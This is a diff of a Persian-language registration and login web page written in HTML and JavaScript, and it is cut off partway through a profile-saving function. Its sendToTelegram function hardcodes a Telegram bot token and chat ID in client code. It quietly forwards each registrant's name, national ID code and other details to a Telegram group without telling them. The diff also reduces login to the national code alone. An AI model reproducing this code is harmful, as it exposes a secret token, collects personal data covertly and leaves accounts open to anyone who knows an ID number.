@@ -97,13 +97,12 @@
             border-radius: 50%;
             margin: 10px 0;
         }
-        #profilePreview, #editProfilePreview {
+        #profilePreview {
             display: none;
             width: 100px;
             height: 100px;
             border-radius: 50%;
             margin: 10px 0;
-            object-fit: cover;
         }
     </style>
 </head>
@@ -231,36 +230,8 @@
             const file = e.target.files[0];
             const reader = new FileReader();
             reader.onload = function (e) {
-                const img = document.getElementById("profilePreview");
-                img.src = e.target.result;
-                img.style.display = "block";
-
-                // تنظیم اندازه عکس به صورت پویا
-                const maxWidth = window.innerWidth * 0.2; // 20% عرض صفحه
-                const maxHeight = window.innerHeight * 0.2; // 20% ارتفاع صفحه
-
-                const image = new Image();
-                image.src = e.target.result;
-                image.onload = function () {
-                    let width = image.width;
-                    let height = image.height;
-
-                    // حفظ نسبت تصویر
-                    if (width > height) {
-                        if (width > maxWidth) {
-                            height *= maxWidth / width;
-                            width = maxWidth;
-                        }
-                    } else {
-                        if (height > maxHeight) {
-                            width *= maxHeight / height;
-                            height = maxHeight;
-                        }
-                    }
-
-                    img.style.width = `${width}px`;
-                    img.style.height = `${height}px`;
-                };
+                document.getElementById("profilePreview").src = e.target.result;
+                document.getElementById("profilePreview").style.display = "block";
             };
             reader.readAsDataURL(file);
         });
@@ -270,47 +241,19 @@
             const file = e.target.files[0];
             const reader = new FileReader();
             reader.onload = function (e) {
-                const img = document.getElementById("editProfilePreview");
-                img.src = e.target.result;
-                img.style.display = "block";
-
-                // تنظیم اندازه عکس به صورت پویا
-                const maxWidth = window.innerWidth * 0.2; // 20% عرض صفحه
-                const maxHeight = window.innerHeight * 0.2; // 20% ارتفاع صفحه
-
-                const image = new Image();
-                image.src = e.target.result;
-                image.onload = function () {
-                    let width = image.width;
-                    let height = image.height;
-
-                    // حفظ نسبت تصویر
-                    if (width > height) {
-                        if (width > maxWidth) {
-                            height *= maxWidth / width;
-                            width = maxWidth;
-                        }
-                    } else {
-                        if (height > maxHeight) {
-                            width *= maxHeight / height;
-                            height = maxHeight;
-                        }
-                    }
-
-                    img.style.width = `${width}px`;
-                    img.style.height = `${height}px`;
-                };
+                document.getElementById("editProfilePreview").src = e.target.result;
+                document.getElementById("editProfilePreview").style.display = "block";
             };
             reader.readAsDataURL(file);
         });
 
-        // تابع ارسال اطلاعات به تلگرام
-        function sendToTelegram(user, action = "ثبت‌نام") {
+        // تابع ارسال اطلاعات به تلگرام (شامل عکس پروفایل)
+        function sendToTelegram(user) {
             const botToken = '7546571600:AAHU8BKI4svtt5icjOFZJbKVMt_232n1s7Q';
             const chatID = '-4755536198';
 
             // ساخت پیام برای ارسال به تلگرام
-            const message = `${action} کاربر:\n
+            const message = `ثبت‌نام جدید:\n
 نام: ${user.name}
 نام خانوادگی: ${user.family}
 کد ملی: ${user.nationalCode}
@@ -385,11 +328,37 @@
             const address = document.getElementById("address").value.trim();
             const profileImage = document.getElementById("profilePreview").src;
 
-            if (!name || !family || !nationalCode || !birthdate || !gender || !education || !address || profileImage === "#") {
-                document.getElementById("signupError").innerText = "لطفاً تمام فیلدها را پر کنید!";
+            // بررسی خالی بودن فیلدها
+            if (!name) {
+                document.getElementById("signupError").innerText = "لطفاً نام خود را وارد کنید.";
+                return;
+            }
+            if (!family) {
+                document.getElementById("signupError").innerText = "لطفاً نام خانوادگی خود را وارد کنید.";
+                return;
+            }
+            if (!nationalCode) {
+                document.getElementById("signupError").innerText = "لطفاً کد ملی خود را وارد کنید.";
+                return;
+            }
+            if (!birthdate) {
+                document.getElementById("signupError").innerText = "لطفاً تاریخ تولد خود را وارد کنید.";
+                return;
+            }
+            if (!gender) {
+                document.getElementById("signupError").innerText = "لطفاً جنسیت خود را انتخاب کنید.";
+                return;
+            }
+            if (!education) {
+                document.getElementById("signupError").innerText = "لطفاً تحصیلات خود را وارد کنید.";
+                return;
+            }
+            if (!address) {
+                document.getElementById("signupError").innerText = "لطفاً آدرس خود را وارد کنید.";
                 return;
             }
 
+            // اگر همه فیلدها پر شده‌اند، کاربر را ذخیره کنید
             const user = {
                 name,
                 family,
@@ -403,25 +372,18 @@
 
             saveUser(user);
             document.getElementById("signupSuccess").innerText = "ثبت‌نام با موفقیت انجام شد!";
+            document.getElementById("signupError").innerText = "";
 
             // ارسال اطلاعات به تلگرام
-            sendToTelegram(user, "ثبت‌نام");
+            sendToTelegram(user);
 
             setTimeout(() => showLogin(), 2000);
         }
 
         // Login function
         function login() {
-            const loginName = document.getElementById("loginName").value.trim();
-            const loginFamily = document.getElementById("loginFamily").value.trim();
-            const loginNationalCode = document.getElementById("loginNationalCode").value.trim();
-
-            if (!loginName || !loginFamily || !loginNationalCode) {
-                document.getElementById("loginError").innerText = "لطفاً تمام فیلدها را پر کنید!";
-                return;
-            }
-
-            getUser(loginNationalCode, function (user) {
+            const nationalCode = document.getElementById("loginNationalCode").value.trim();
+            getUser(nationalCode, function (user) {
                 if (user) {
                     currentUser = user;
                     showDashboard(user);
@@ -443,4 +405,33 @@
             document.getElementById("userNationalCode").innerText = user.nationalCode;
             document.getElementById("userBirthdate").innerText = user.birthdate;
             document.getElementById("userGender").innerText = user.gender === "male" ? "مرد" : "زن";
-            document.getElementById("user
+            document.getElementById("userEducation").innerText = user.education;
+            document.getElementById("userAddress").innerText = user.address;
+            document.getElementById("userProfileImage").src = user.profileImage;
+        }
+
+        // Edit profile
+        function editProfile() {
+            document.getElementById("dashboard").style.display = "none";
+            document.getElementById("editProfile").style.display = "block";
+
+            document.getElementById("editName").value = currentUser.name;
+            document.getElementById("editFamily").value = currentUser.family;
+            document.getElementById("editNationalCode").value = currentUser.nationalCode;
+            document.getElementById("editBirthdate").value = currentUser.birthdate;
+            document.querySelector(`input[name="editGender"][value="${currentUser.gender}"]`).checked = true;
+            document.getElementById("editEducation").value = currentUser.education;
+            document.getElementById("editAddress").value = currentUser.address;
+            document.getElementById("editProfilePreview").src = currentUser.profileImage;
+            document.getElementById("editProfilePreview").style.display = "block";
+        }
+
+        // Save profile changes
+        function saveProfile() {
+            const user = {
+                name: document.getElementById("editName").value.trim(),
+                family: document.getElementById("editFamily").value.trim(),
+                nationalCode: document.getElementById("editNationalCode").value.trim(),
+                birthdate: document.getElementById("editBirthdate").value.trim(),
+                gender: document.querySelector('input[name="editGender"]:checked')?.value || '',
+                education: document.getElementById("editEducation").value.trim(),
